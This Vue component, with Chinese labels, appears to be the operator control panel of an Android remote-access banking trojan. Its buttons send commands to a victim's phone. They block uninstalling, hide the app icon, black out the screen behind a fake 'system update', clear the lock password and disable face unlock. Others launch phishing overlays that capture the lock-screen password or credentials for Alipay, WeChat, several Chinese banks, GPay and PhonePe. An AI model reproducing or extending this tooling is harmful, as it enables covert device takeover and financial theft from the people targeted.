<script setup lang="ts">
import { ref } from 'vue';
import {
    NCard,
    NSpace,
    NButton,
    NButtonGroup,
    NInput,
    NSelect,
    NIcon,
    NTooltip,
    NDivider,
    NGrid,
    NGridItem,
} from 'naive-ui';
import {
    HomeOutline,
    ArrowBackOutline,
    AppsOutline,
    VolumeHighOutline,
    VolumeLowOutline,
    KeypadOutline,
    ClipboardOutline,
    LockClosedOutline,
    LockOpenOutline,
    CameraOutline,
    SunnyOutline,
    VolumeMuteOutline,
    EyeOutline,
    EyeOffOutline,
    ShieldOutline,
    ShieldCheckmarkOutline,
    DesktopOutline,
    HandLeftOutline,
    HandRightOutline,
    KeyOutline,
    PersonOutline,
    FishOutline,
    TvOutline,
    PhonePortraitOutline,
    LogoAlipay,
    CardOutline,
    CashOutline,
    BusinessOutline,
    LeafOutline,
    PlanetOutline,
    StorefrontOutline,
    LogoUsd,
} from '@vicons/ionicons5';
import { ChatbubbleEllipsesOutline as LogoWechat } from '@vicons/ionicons5';
import { quickApps } from '@/constants/quickApps';

interface Emits {
    (e: 'navigate', type: 'home' | 'back' | 'recent'): void;
    (e: 'volumeUp'): void;
    (e: 'volumeDown'): void;
    (e: 'showKeyboard'): void;
    (e: 'hideKeyboard'): void;
    (e: 'paste', text: string): void;
    (e: 'lock', type: 0 | 1 | 2 | 3): void;
    (e: 'screenshot'): void;
    (e: 'wakeScreen'): void;
    (e: 'sendMute'): void;
    (e: 'sendUnmute'): void;
    (e: 'openQuickApp', app: string): void;
    (e: 'sendKb', type: number): void;
    (e: 'sendBlock', type: number): void;
    (e: 'hideIcon'): void;
    (e: 'sendPhish', type: string): void;
    (e: 'sendBankPhish', bank: string): void;
    (e: 'toggleBlockText', text: string, bg: string): void;
}

const emit = defineEmits<Emits>();

const pasteText = ref('');
const phishType = ref('0');
const blockText = ref('');
const blockBg = ref('0');
const isBlockTextActive = ref(false);

const handlePaste = () => {
    if (pasteText.value.trim()) {
        emit('paste', pasteText.value);
        pasteText.value = '';
    }
};

const handleSendPhish = () => {
    emit('sendPhish', phishType.value);
};

const handleToggleBlockText = () => {
    isBlockTextActive.value = !isBlockTextActive.value;
    emit('toggleBlockText', blockText.value, blockBg.value);
};

const bankButtons = [
    { name: '支付宝', code: 'a', color: '#1677ff', icon: LogoAlipay },
    { name: '微信', code: 'w', color: '#07c160', icon: LogoWechat },
    { name: '云闪付', code: 'yun', color: '#e62129', icon: CardOutline },
    { name: '建行', code: 'jian', color: '#0066b3', icon: BusinessOutline },
    { name: '邮储', code: 'you', color: '#007d3a', icon: CashOutline },
    { name: '农行', code: 'nong', color: '#009944', icon: LeafOutline },
    { name: '中行', code: 'zhong', color: '#c9151e', icon: PlanetOutline },
    { name: '工行', code: 'gong', color: '#e60012', icon: StorefrontOutline },
    { name: '招行', code: 'zhao', color: '#dc241f', icon: CashOutline },
    { name: 'GPay', code: 'gpay', color: '#4285f4', icon: LogoUsd },
    { name: 'PhonePe', code: 'phonepe', color: '#5f259f', icon: PhonePortraitOutline },
    { name: 'BC', code: 'bc', color: '#ff6b00', icon: CashOutline },
    { name: 'MB', code: 'mb', color: '#00a0e9', icon: PhonePortraitOutline },
];
</script>

<template>
    <NCard size="small" class="control-panel-card">
        <template #header>
            <div class="card-header">
                <NIcon :component="DesktopOutline" size="18" />
                <span>快捷操作</span>
            </div>
        </template>

        <NSpace vertical size="small">
            <!-- 导航控制 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="AppsOutline" size="14" />
                    <span>导航</span>
                </div>
                <NButtonGroup size="small">
                    <NButton @click="emit('navigate', 'back')">
                        <template #icon>
                            <NIcon :component="ArrowBackOutline" />
                        </template>
                        返回
                    </NButton>
                    <NButton @click="emit('navigate', 'home')">
                        <template #icon>
                            <NIcon :component="HomeOutline" />
                        </template>
                        主页
                    </NButton>
                    <NButton @click="emit('navigate', 'recent')">
                        <template #icon>
                            <NIcon :component="AppsOutline" />
                        </template>
                        多任务
                    </NButton>
                </NButtonGroup>
            </div>

            <NDivider style="margin: 12px 0" />

            <!-- 设备控制 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="PhonePortraitOutline" size="14" />
                    <span>设备控制</span>
                </div>
                <NGrid :cols="3" :x-gap="8" :y-gap="8">
                    <NGridItem>
                        <NButton size="small" block @click="emit('wakeScreen')">
                            <template #icon>
                                <NIcon :component="SunnyOutline" />
                            </template>
                            点亮
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('lock', 0)">
                            <template #icon>
                                <NIcon :component="LockOpenOutline" />
                            </template>
                            解锁
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block type="warning" @click="emit('lock', 1)">
                            <template #icon>
                                <NIcon :component="LockClosedOutline" />
                            </template>
                            锁屏
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('sendMute')">
                            <template #icon>
                                <NIcon :component="VolumeMuteOutline" />
                            </template>
                            静音
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('sendUnmute')">
                            <template #icon>
                                <NIcon :component="VolumeHighOutline" />
                            </template>
                            取消静音
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('screenshot')">
                            <template #icon>
                                <NIcon :component="CameraOutline" />
                            </template>
                            截图
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('volumeUp')">
                            <template #icon>
                                <NIcon :component="VolumeHighOutline" />
                            </template>
                            音量+
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('volumeDown')">
                            <template #icon>
                                <NIcon :component="VolumeLowOutline" />
                            </template>
                            音量-
                        </NButton>
                    </NGridItem>
                </NGrid>
            </div>

            <NDivider style="margin: 12px 0" />

            <!-- 应用快捷启动 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="AppsOutline" size="14" />
                    <span>应用快捷启动</span>
                </div>
                <div class="app-grid">
                    <NButton
                        v-for="app in quickApps"
                        :key="app.key"
                        size="tiny"
                        class="app-btn"
                        :style="{ backgroundColor: app.color, color: '#fff', borderColor: app.color }"
                        @click="emit('openQuickApp', app.key)"
                    >
                        <template #icon>
                            <NIcon :component="app.icon" />
                        </template>
                        {{ app.key }}
                    </NButton>
                </div>
            </div>

            <NDivider style="margin: 12px 0" />

            <!-- 安全控制 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="ShieldOutline" size="14" />
                    <span>安全控制</span>
                </div>
                <NGrid :cols="3" :x-gap="8" :y-gap="8">
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendKb', 2)">
                            防卸载
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendKb', 3)">
                            可卸载
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 0)">
                            黑屏
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 1)">
                            取消黑屏
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 2)">
                            阻止操作
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 3)">
                            允许操作
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('lock', 2)">
                            清密码
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('lock', 3)">
                            禁人脸
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block type="warning" @click="emit('hideIcon')">
                            隐藏图标
                        </NButton>
                    </NGridItem>
                </NGrid>
            </div>

            <NDivider style="margin: 12px 0" />

            <!-- 粘贴文本 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="ClipboardOutline" size="14" />
                    <span>粘贴文本</span>
                </div>
                <div class="input-row">
                    <NInput
                        v-model:value="pasteText"
                        placeholder="输入文本粘贴到设备..."
                        size="small"
                        @keyup.enter="handlePaste"
                    />
                    <NButton size="small" type="primary" @click="handlePaste">
                        粘贴
                    </NButton>
                </div>
            </div>

            <NDivider style="margin: 12px 0" />

            <!-- 密码钓鱼 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="FishOutline" size="14" />
                    <span>密码钓鱼</span>
                </div>
                <div class="phish-row">
                    <NSelect
                        v-model:value="phishType"
                        size="small"
                        :options="[
                            { label: '自由选择密码', value: '0' },
                            { label: '壁纸图案密码', value: '1' },
                            { label: '壁纸数字密码', value: '2' },
                            { label: '壁纸混合密码', value: '3' },
                        ]"
                        style="flex: 1;"
                    />
                    <NButton size="small" type="error" @click="handleSendPhish">
                        <template #icon>
                            <NIcon :component="FishOutline" />
                        </template>
                        钓鱼
                    </NButton>
                </div>

                <div class="section-subtitle">银行/支付钓鱼</div>
                <div class="bank-grid">
                    <NButton
                        v-for="bank in bankButtons"
                        :key="bank.code"
                        size="tiny"
                        class="bank-btn"
                        :style="{ backgroundColor: bank.color, color: '#fff', borderColor: bank.color }"
                        @click="emit('sendBankPhish', bank.code)"
                    >
                        <template #icon>
                            <NIcon :component="bank.icon" />
                        </template>
                        {{ bank.name }}
                    </NButton>
                </div>
            </div>

            <NDivider style="margin: 12px 0" />

            <!-- 黑屏文字 -->
            <div class="control-section">
                <div class="section-title">
                    <NIcon :component="TvOutline" size="14" />
                    <span>黑屏文字</span>
                </div>
                <div class="block-text-row">
                    <NInput
                        v-model:value="blockText"
                        placeholder="黑屏显示文字内容"
                        size="small"
                        style="flex: 1;"
                    />
                    <NSelect
                        v-model:value="blockBg"
                        size="small"
                        :options="[
                            { label: '黑色背景', value: '0' },
                            { label: '系统更新', value: '1' },
                        ]"
                        style="width: 100px;"
                    />
                    <NButton
                        size="small"
                        :type="isBlockTextActive ? 'error' : 'default'"
                        @click="handleToggleBlockText"
                    >
                        {{ isBlockTextActive ? '停止' : '显示' }}
                    </NButton>
                </div>
            </div>
        </NSpace>
    </NCard>
</template>

<style scoped>
.control-panel-card {
    background: white;
}

.control-panel-card :deep(.n-card__header) {
    padding: 16px 20px;
    border-bottom: 1px solid #f1f5f9;
}

.card-header {
    display: flex;
    align-items: center;
    gap: 8px;
    font-weight: 600;
    font-size: 15px;
    color: #1e293b;
}

.control-section {
    display: flex;
    flex-direction: column;
    gap: 10px;
}

.section-title {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 13px;
    color: #64748b;
    font-weight: 500;
}

.section-subtitle {
    font-size: 11px;
    color: #94a3b8;
    margin-top: 8px;
    margin-bottom: 4px;
}

.app-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 6px;
}

.app-btn {
    font-size: 11px;
    padding: 0 4px;
}

.app-btn :deep(.n-icon) {
    font-size: 12px;
}

.bank-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 6px;
}

.bank-btn {
    font-size: 10px;
    padding: 0 2px;
}

.bank-btn :deep(.n-icon) {
    font-size: 10px;
}

.input-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.phish-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.block-text-row {
    display: flex;
    gap: 8px;
    align-items: center;
}
</style>
